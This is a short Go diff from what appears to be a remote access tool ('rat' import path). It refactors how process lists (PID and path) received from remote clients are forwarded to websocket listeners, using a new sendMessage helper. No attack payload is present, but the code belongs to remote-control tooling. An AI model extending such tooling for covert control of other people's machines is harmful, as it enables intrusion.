@@ -2,10 +2,6 @@ package main
 
 import (
 	"rat/shared/network/header"
-
-	"encoding/json"
-
-	"golang.org/x/net/websocket"
 )
 
 type Process struct {
@@ -29,11 +25,7 @@ func (packet ProcessPacket) Init(c *Client) {
 func (packet ProcessPacket) OnReceive(c *Client) error {
 	for _, proc := range packet.Processes {
 		if ws, ok := c.Listeners[header.ProcessHeader]; ok {
-			message := ProcessMessage{proc.PID, proc.Path}
-			mstr, _ := json.Marshal(&message)
-			event := newEvent(ProcessQueryEvent, c.Id, string(mstr))
-
-			err := websocket.JSON.Send(ws, &event)
+			err := sendMessage(ws, c, ProcessMessage{proc.PID, proc.Path})
 
 			if err != nil {
 				return err
